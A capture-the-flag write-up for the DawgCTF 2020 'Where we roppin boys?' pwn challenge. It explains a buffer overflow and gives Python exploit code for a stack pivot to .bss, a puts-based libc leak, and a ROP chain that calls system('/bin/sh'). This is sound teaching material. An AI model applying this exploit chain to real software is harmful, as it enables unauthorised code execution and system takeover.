## Where we roppin boys? (350pt)

### Description

> Forknife is still a thing right?
>
> nc [ctf.umbccd.io](http://ctf.umbccd.io/) 4100
>
> Author: trashcanna

### Attachment

[rop](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DawgCTF2020/pwn/rop/rop)

### Analysis

#### buffer overflow

bof in function `tryme` :

```c
undefined4 tryme(void){
  char local_10 [8];
  
  fgets(local_10,0x19,stdin);
  fflush(stdin);
  return 0;
}
```

> 25 bytes copied to `local_10[8]`

![](http://image.taqini.space/img/20200413111414.png)

> only 8 bytes can be overwritten to `esp` 

there was no enough room for args of any function, so we need to enlarge the buffer by stack pivot and then rop attack was available 

### Solution

#### ret2text (fgets)

return to `fgets` so that we can read bytes to `buf` again:

```nasm
   0x80496d1 <tryme+ 7>:	call   0x8049100 <__x86.get_pc_thunk.bx>
   0x80496d6 <tryme+12>:	add    ebx,0x292a
   0x80496dc <tryme+18>:	mov    eax,DWORD PTR [ebx-0x4]
   0x80496e2 <tryme+24>:	mov    eax,DWORD PTR [eax]
   0x80496e4 <tryme+26>:	sub    esp,0x4
   0x80496e7 <tryme+29>:	push   eax
   0x80496e8 <tryme+30>:	push   0x19
   0x80496ea <tryme+32>:	lea    eax,[ebp-0xc]
   0x80496ed <tryme+35>:	push   eax
=> 0x80496ee <tryme+36>:	call   0x8049050 <fgets@plt>
```

> `fgets(ebp-0xc,0x19,stdin);`

#### stack pivot

>  bof cause `ebp` was overwritten, so we should make sure that new `ebp` is an area of readable & writable memory (e.g. `.bss` section)

set `ebp` to `bss+0x200` and overwrite return address with `0x80496d1`(call `fgets`):

```python
ebp = elf.bss()+0x200
# stack pivot
payload = cyclic(12)
payload+= p32(ebp)          # ebp
payload+= p32(0x080496d1)   # return address
payload+= p32(0xdeadbeef)   # padding
```

after that, new address of `buf` was in `.bss` while calling `fgets` again: 

![](http://image.taqini.space/img/20200413121247.png)

now we can puts `ropchain` into new `buf` to start rop attack

#### rop attack

set `ebp` to `buf-4` and execute gadget `leave;ret` to entry `ropchain`:

```python
# rop1
leave = 0x8049712 # leave ; ret
ropchain = p32(elf.sym['puts'])+p32(elf.sym['main'])+p32(elf.got['puts'])
pl2 = ropchain        # (12)
pl2+= p32(ebp-0xc-4)  # ebp (4)
pl2+= p32(leave)      # return address (4)
pl2+= p32(0xdeadbeef) # padding (4)
se(pl2)
```

![](http://image.taqini.space/img/20200413130038.png)

this `ropchain` can leak address of `puts` in libc:

```python
puts = uu32(rc(4))
info_addr('puts',puts)
```

we can calc the base address of libc and then address of other function in libc:

```python
libcbase = puts-libc.sym['puts']
system = libcbase+libc.sym['system']
binsh = libcbase+libc.search('/bin/sh').next()
```

we back to `main` after the first rop attack, so stack pivot again and execute the second `ropchain` 

```python
# stack pivot 
ebp = elf.bss()+0x800
pl3 = cyclic(12)
pl3+= p32(ebp)          # ebp
pl3+= p32(0x080496d1)   # return address
pl3+= p32(0xdeadbeef)   # padding
se(pl3)

# rop2
ropchain = p32(system)+p32(elf.sym['main'])+p32(binsh)
pl4 = ropchain
pl4+= p32(ebp-0xc-4)  # ebp
pl4+= p32(leave)      # return address
pl4+= p32(0xdeadbeef) # padding
se(pl4)
```

> set `ebp` to `bss+0x800` because `system()` need more area of stack

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/DawgCTF2020/pwn/rop) 


